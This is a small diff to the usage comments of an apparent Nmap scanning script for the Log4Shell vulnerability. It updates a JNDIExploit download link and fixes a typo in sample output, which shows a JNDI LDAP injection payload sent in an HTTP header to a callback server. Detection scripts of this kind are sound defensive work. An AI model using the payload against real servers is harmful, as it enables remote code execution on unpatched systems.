@@ -19,7 +19,7 @@ attacker-controlled server. Successful exploitation could lead to RCE.
 Usage
 
 Method A:
-    - Download JNDIExploit from GitHub (https://github.com/feihong-cs/JNDIExploit)
+    - Download JNDIExploit from GitHub (https://github.com/giterlizzi/JNDIExploit/releases/download/v1.2/JNDIExploit.zip)
 
     - Start JNDIExploit server:
         java -jar JNDIExploit.jar
@@ -57,7 +57,7 @@ categories = {"vuln", "safe", "external"}
 -- PORT   STATE SERVICE
 -- 80/tcp open  http
 -- | log4shell: 
--- |   (!) Sended payload ${jndi:ldap://172.17.42.1:13890/log4shell/127.0.0.1/8080} using X-Api-Version header.
+-- |   (!) Sent payload ${jndi:ldap://172.17.42.1:13890/log4shell/127.0.0.1/8080} using X-Api-Version header.
 -- |   For confirmation see 172.17.42.1:13890 server log
 -- |_  [...]
 -- @changelog
